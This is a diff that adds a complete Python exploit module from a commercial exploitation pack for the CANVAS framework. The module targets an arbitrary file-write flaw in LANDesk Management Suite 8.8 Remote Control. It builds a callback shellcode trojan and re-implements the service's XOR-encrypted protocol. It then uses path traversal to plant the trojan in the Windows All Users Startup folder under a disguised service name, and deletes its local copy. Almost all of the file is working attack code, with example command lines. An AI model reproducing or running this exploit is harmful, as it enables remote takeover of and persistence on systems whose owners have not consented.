@@ -1,0 +1,247 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+import struct
+import random
+
+if "." not in sys.path:
+    sys.path.append(".")
+
+import win32MosdefShellServer
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+from shellcode import win32shell
+from encoder import *
+from win32Node import win32Node
+from shelllistener import shelllistener
+
+
+# GUI info
+NAME = "[0 Day] LANDesk Management Suite 8.8 Remote Control Arbitrary File Writing Vulnerability"
+
+DESCRIPTION = "Arbitrary file writing vulnerability in LANDesk Management Suite 8.8 Remote Control"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "Not public"
+DOCUMENTATION["Versions Affected"] = "LANDesk Management Suite 8.8"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = "This exploit creates a MOSDEF trojan in the startup directory."
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 5555 -v 1 -l 192.168.1.1
+.\exploits\d2sec_landesk_rc -l 192.168.1.1 -d 5555 -t 192.168.1.145 -p 9535
+"""
+
+CHANGELOG = """
+"""
+    
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        
+        self.port = 9535
+        self.host = ""
+        self.name = NAME
+        self.badstring = "\x00"
+        self.trojanname = "trojan.exe"
+        self.dstfile = "\..\..\..\..\..\..\..\..\..\..\Documents and Settings\All Users\Start Menu\Programs\Startup\LsmSnmpSrv.exe"
+        
+        return
+
+    def neededListenerTypes(self):
+        return [canvasengine.WIN32MOSDEF]
+    
+    def test(self):        
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))
+                
+        s = self.gettcpsock()        
+        
+        try:
+            s.connect((self.host, self.port))
+        except:
+            self.log("No connection could be established")
+            return 0        
+        
+        return 1
+
+    def maketrojan(self):
+        shellcode = self.createWin32Shellcode(self.badstring, self.callback.ip, self.callback.port)        
+        myPElib = pelib.PElib()
+	
+        self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
+        
+        self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))
+        file(self.trojanname, "wb").write(self.mosdeftrojan)
+        self.setInfo("%s - done"%(NAME))
+        ret = len(self.mosdeftrojan) != 0
+        
+        return ret
+        
+    def recv_xor_table(self, s):
+        tab = []
+
+        tmp = s.recv(0x108) 
+ 
+        if (len(tmp) != 0x108):
+            return tab
+ 
+        for i in range(0, 0x42):
+            tab.append(struct.unpack('<l', tmp[i*4:(i+1)*4])[0])
+
+        return tab
+
+    def generate_xor_table(self, s):
+        tab = []
+        tmp = ""
+ 
+        for i in range(0, 0x42):   
+            val = random.randint(0, 0x7fffffff)  
+            tab.append(val)
+            tmp += struct.pack('<L', val)
+
+        s.send(tmp)
+
+        return tab
+
+    def mk_filepkt(self, code, handle, data):
+        buff = struct.pack('<B', code) + struct.pack('<H', len(data) + 7) + struct.pack('<L', handle) + data		
+	   
+        return buff
+
+    def send_data(self, s, data, r_tab, s_tab):	
+        if(data): 
+            data = self.xor_encrypt(data, 0, r_tab, s_tab)
+            code = 4
+        else:
+            code = 0
+     
+        data = 'RCH1' + struct.pack('<H', len(data) + 12) + "\x00\x00" + struct.pack('<L', code) + data
+        s.send(data)
+
+    def xor_encrypt(self, data, type, r_tab, s_tab):
+       if (type == 0):
+           tab = s_tab
+       else:
+           tab = r_tab
+
+       pos = 0
+       olen = len(data)
+ 
+       if (olen % 4):   
+           data += "\x00" * (4-(olen%4))
+           mylen = len(data)
+       else:
+           mylen = olen
+
+       tmp = ""
+
+       v1 = tab[64]
+       v2 = tab[65]
+
+       while (pos < mylen): 
+           v1 = (v1 + 1) & 0x3f
+           v3 = tab[v1]
+           v2 = (v2 + v3) & 0x3f
+           v4 = tab[v2]
+           tab[v1] = v4
+           tab[v2] = v3
+
+           v = (v3 + v4) & 0x3f      
+  
+           num = struct.unpack('<l', data[pos:pos+4])[0] ^ tab[v]
+           tmp += struct.pack('<L', num)
+
+           pos += 4
+
+       tab[64] = v1
+       tab[65] = v2
+
+       if (type == 0):
+           s_tab = tab
+       else:
+           r_tab = tab
+
+       return tmp[0:mylen-1]
+   
+    def run(self):	    		
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))                
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Attacking %s:%d"%(self.host, self.port))
+
+        self.maketrojan()                
+                
+        try:            
+            s = self.gettcpsock()
+            s.connect((self.host, self.port))
+            
+            r_tab = self.recv_xor_table(s)
+            if (r_tab == []):
+                return 0
+            	
+            s_tab = self.generate_xor_table(s)
+            if (s_tab == []):
+                return 0
+            
+            # CreateFile
+            handle = 0x41414141
+            self.dstfile += "\x00"
+
+            data = self.mk_filepkt(15, handle, self.dstfile)
+            self.send_data(s, data, r_tab, s_tab)
+
+            buf = s.recv(1024)
+            
+            # WriteFile
+            f = open(self.trojanname, "rb")
+            sploitstring = f.read()
+            f.close()
+            
+            os.remove(self.trojanname)
+
+            data = self.mk_filepkt(17, handle, sploitstring)
+            self.send_data(s, data, r_tab, s_tab)
+
+            # CloseHandle
+            data = self.mk_filepkt(18, handle, "");
+            self.send_data(s, data, r_tab, s_tab)
+            
+            s.close()
+                        
+        except:            
+            self.log("Attack reported no open socket - service died?")
+            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
+            return 0
+        
+        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME, self.host, self.port))
+        
+        return 1
+                
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
+    
